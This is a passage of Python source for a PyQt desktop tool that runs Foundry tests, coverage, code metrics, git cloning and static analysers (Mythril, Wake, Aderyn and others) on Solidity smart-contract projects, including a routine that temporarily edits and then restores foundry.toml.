            self.terminal_queue.put(f"<span style='color:red;'>An unexpected error occurred during initialization: {e}</span>")

    def run_forge_tests_with_verbosity(self):
        project_root = self.get_project_root()
        if not project_root:
            self.terminal_queue.put("<span style='color: red;'>No project context. Please select a Forge project folder.</span>")
            return
        
        verbosity_text = self.test_verbosity_dropdown.currentText()
        flag_match = re.search(r'(-\w+)', verbosity_text)
        flag = flag_match.group(1) if flag_match else "-vv"
        
        self.clear_output()
        self.terminal_queue.put(f"<b>Running all project tests with verbosity {flag}...</b>\n")
        self.run_command(f"forge test {flag}", cwd=project_root)
        
    def run_solidity_metrics(self):
        target_path = self.get_project_root() or self.selected_contract
        if not target_path:
            self.terminal_queue.put("<span style='color: red;'>Please select a project folder or a single file first.</span>")
            return
        
        scan_path = target_path if os.path.isdir(target_path) else os.path.dirname(target_path)
        
        self.clear_output()
        self.terminal_queue.put(f"<b>Running solidity-code-metrics on: {scan_path}</b>\n")
        
        glob_pattern = f'"{scan_path}/**/*.sol"'
        
        command = f"solidity-code-metrics -b {glob_pattern}"
        self.run_command(command, cwd=scan_path)

    def run_cloc(self):
        target_path = self.get_project_root() or self.selected_contract
        if not target_path:
            self.terminal_queue.put("<span style='color: red;'>Please select a project folder or a single file first.</span>")
            return
        
        self.clear_output()
        self.terminal_queue.put(f"<b>Running cloc on: {target_path} (excluding node_modules, lib)</b>\n")
        
        command = f"cloc --exclude-dir=node_modules,lib {shlex.quote(target_path)}"
        self.run_command(command)
        
    def run_forge_remappings(self):
        project_root = self.get_project_root()
        if not project_root:
            self.terminal_queue.put("<span style='color: red;'>No project context. Please select a Forge project folder.</span>")
            return
        self.clear_output()
        self.terminal_queue.put(f"<b>Displaying forge remappings...</b>\n")
        self.run_command("forge remappings", cwd=project_root)

    def run_coverage_with_auto_fix(self):
        project_root = self.get_project_root()
        if not project_root:
            self.terminal_queue.put("<span style='color: red;'>Please select a Forge project folder first.</span>")
            return
        if not self.is_map_ready or not self.contract_map_data:
            self.terminal_queue.put("<span style='color:orange;'>Please run 'Generate/Refresh Project Map' first.</span>")
            return
            
        self.clear_output()
        self.terminal_queue.put("<b>🤖 Starting Coverage Auto-Fix Workflow...</b>")
        threading.Thread(target=self._run_coverage_with_fix_thread, daemon=True).start()

    def _run_coverage_with_fix_thread(self):
        project_root = self.get_project_root()
        toml_path = os.path.join(project_root, 'foundry.toml')
        original_toml_content = None
        
        if os.path.exists(toml_path):
            try:
                with open(toml_path, 'r') as f:
                    original_toml_content = f.read()
                self.terminal_queue.put("✅ Original foundry.toml backed up in memory.")
            except Exception as e:
                self.terminal_queue.put(f"<span style='color:red;'>Could not back up foundry.toml: {e}</span>")
                return
        else:
             self.terminal_queue.put("No original foundry.toml found. Will create one temporarily.")

        try:
            contract_files = sorted(list(set(c['source_file_relative'] for c in self.contract_map_data.values())))
            failing_files = []
            self.terminal_queue.put(f"Testing {len(contract_files)} contract files for compatibility...")

            for contract_path in contract_files:
                self.terminal_queue.put(f"Testing: {contract_path}")
                command = f"forge coverage --match-path {shlex.quote(contract_path)}"
                result = subprocess.run(command, shell=True, cwd=project_root, capture_output=True, text=True)
                
                error_string = "inline assembly block with no AST attribute"
                if result.returncode != 0 and error_string in (result.stdout + result.stderr):
                    self.terminal_queue.put(f"  <b style='color:orange;'>-> Found incompatible file: {contract_path}</b>")
                    formatted_path = contract_path.replace('\\', '/')
                    failing_files.append(f"./{formatted_path}")
            
            if failing_files:
                self.terminal_queue.put(f"<br><b>Applying temporary fix for {len(failing_files)} file(s)...</b>")
                config = toml.loads(original_toml_content) if original_toml_content else {}
                
                if 'coverage_options' in config:
                    del config['coverage_options']
                
                profile = config.setdefault('profile', {})
                default_profile = profile.setdefault('default', {})
                coverage_opts = default_profile.setdefault('coverage_options', {})
                exclude_paths = coverage_opts.setdefault('exclude_paths', [])

                for f_path in failing_files:
                    if f_path not in exclude_paths:
                        exclude_paths.append(f_path)
                
                with open(toml_path, 'w') as f:
                    toml.dump(config, f)
                self.terminal_queue.put("✅ Temporary foundry.toml with exclusions is now active.")
            else:
                self.terminal_queue.put("<br><span style='color: green;'>✅ No incompatible files found. Running coverage on original config.</span>")
            
            self.terminal_queue.put("<hr><b>🚀 Running full coverage report...</b>")
            self.run_command("forge coverage", cwd=project_root)

        finally:
            self.terminal_queue.put("<hr><b>✅ Restoring original foundry.toml...</b>")
            try:
                if original_toml_content:
                    with open(toml_path, 'w') as f:
                        f.write(original_toml_content)
                    self.terminal_queue.put("✅ Original foundry.toml has been restored.")
                elif os.path.exists(toml_path):
                    os.remove(toml_path)
                    self.terminal_queue.put("✅ Temporary foundry.toml has been deleted.")
            except Exception as e:
                self.terminal_queue.put(f"<span style='color:red;'><b>Critical Error:</b> Failed to restore foundry.toml: {e}</span>")
            self.terminal_queue.put("<br><b>Workflow Complete.</b>")

    def debug_selected_test(self):
        project_root = self.get_project_root()
        if not project_root:
            self.terminal_queue.put("<span style='color: red;'>No project selected.</span>")
            return
        
        selected_indexes = self.file_explorer.selectedIndexes()
        if not selected_indexes:
            self.terminal_queue.put("<span style='color: orange;'>Please select a test file in the Project Explorer.</span>")
            return
            
        file_path = self.fs_model.filePath(selected_indexes[0])
        if not file_path.endswith(".t.sol"):
            self.terminal_queue.put("<span style='color: orange;'>Please select a Solidity test file (.t.sol).</span>")
            return
            
        func_sig, ok = QInputDialog.getText(self, 'Debug Test', 'Enter function signature to debug (e.g., testExploit()):')
        if ok and func_sig:
            relative_path = os.path.relpath(file_path, project_root)
            command_to_run = f'forge debug {shlex.quote(relative_path)} --sig {shlex.quote(func_sig)}'
            
            full_command = f'gnome-terminal --working-directory={shlex.quote(project_root)} -- bash -c "{command_to_run}; echo; read -p \\"Debugger finished. Press Enter to close...\\""'
            
            self.terminal_queue.put(f"<b>🚀 Launching debugger in new terminal...</b>")
            self.terminal_queue.put(f"   <b>Command:</b> {command_to_run}")
            try:
                subprocess.Popen(full_command, shell=True)
            except Exception as e:
                self.terminal_queue.put(f"<span style='color: red;'>Failed to launch debugger. Ensure 'gnome-terminal' is installed or modify the command for your OS: {e}</span>")

    def clear_output(self):
        self.terminal_output.clear()

    def change_solc_version(self):
        self.clear_output()
        self.run_command(f"solc-select use {self.version_var.currentText()}")

    def get_project_root(self):
        if self.selected_project_path:
            return self.selected_project_path
        return None
    
    def run_git_clone(self):
        url, ok = QInputDialog.getText(self, 'Clone Git Repository', 'Enter repository URL:')
        if ok and url:
            save_dir = QFileDialog.getExistingDirectory(self, "Select Directory to Clone Into", self.home_dir)
            if save_dir:
                command = f"git clone {shlex.quote(url)}"
                self.terminal_queue.put(f"<b>Cloning repository: {url} into {save_dir}</b>")
                self.run_command(command, cwd=save_dir)
    
    def show_download_instructions(self):
        QMessageBox.information(self, "Downloading from Block Explorer",
            "To analyze a project from a block explorer (like Etherscan or Basescan):\n\n"
            "1. Find the project's official GitHub repository. This is often linked under the 'Contract' tab or in the project's official documentation/website.\n\n"
            "2. Copy the GitHub repository URL.\n\n"
            "3. Use the 'Clone from Git URL' button in this application and paste the URL.\n\n"
            "This ensures you get the complete and correct source code, which is required for a successful analysis.")

    def run_mythril_scan(self):
        self.clear_output()
        if self.selected_contract:
            self.terminal_queue.put("<b>Running Mythril analysis...</b>")
            self.run_command(f"myth analyze {shlex.quote(self.selected_contract)}")
        else:
            self.terminal_queue.put("<span style='color: orange;'>Mythril analysis requires a single contract file to be selected.</span>")

    def run_solcscan_scan(self):
        self.clear_output()
        if self.selected_contract:
            self.terminal_queue.put("<b>Running Solcscan analysis...</b>")
            self.run_command(f"solcscan scan {shlex.quote(self.selected_contract)}")
        else:
            self.terminal_queue.put("<span style='color: orange;'>Solcscan analysis requires a single contract file to be selected.</span>")

    def run_falcon_scan(self):
        self.clear_output()
        if self.selected_contract:
            self.terminal_queue.put("<b>Running Falcon analysis...</b>")
            self.run_command(f"falcon {shlex.quote(self.selected_contract)}")
        else:
            self.terminal_queue.put("<span style='color: orange;'>Falcon analysis requires a single contract file to be selected.</span>")

    def run_wake_scan(self):
        project_root = self.get_project_root()
        self.clear_output()
        if project_root:
            self.terminal_queue.put("<b>Running Wake analysis...</b>")
            self.run_command("wake detect all", cwd=project_root)
        else:
            self.terminal_queue.put("<span style='color: orange;'>Wake analysis requires a project to be selected.</span>")

    def run_aderyn_scan(self):
        project_root = self.get_project_root()
        self.clear_output()
        if project_root:
            self.terminal_queue.put("<b>Running Aderyn analysis...</b>")
            self.run_command("aderyn", cwd=project_root)
        else:
            self.terminal_queue.put("<span style='color: orange;'>Aderyn analysis requires a project to be selected.</span>")


if __name__ == "__main__":
    if sys.platform.startswith('linux'):
        if 'WAYLAND_DISPLAY' in os.environ and 'QT_QPA_PLATFORM' not in os.environ:
             os.environ['QT_QPA_PLATFORM'] = 'xcb'
             
    app = QApplication(sys.argv)
    window = Application()
    window.show()
    sys.exit(app.exec_())
